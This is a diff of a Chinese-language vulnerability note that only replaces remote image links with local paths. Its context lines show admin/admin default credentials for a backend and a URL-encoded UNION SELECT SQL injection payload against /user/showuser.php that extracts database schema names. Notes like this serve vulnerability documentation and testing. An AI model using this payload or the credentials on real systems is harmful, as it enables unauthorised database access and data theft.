@@ -20,7 +20,7 @@
 
 登录页面
 
-![image-20220519183747439](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191837588.png)
+![image-20220519183747439](./images/202205191837588.png)
 
 默认口令登录后台 admin/admin
 
@@ -30,4 +30,4 @@
 /user/showuser.php?id=1%20union%20select%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,(select%20group_concat(SCHEMA_NAME)%20f
 ```
 
-![image-20220519183758066](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205191837110.png)
+![image-20220519183758066](./images/202205191837110.png)
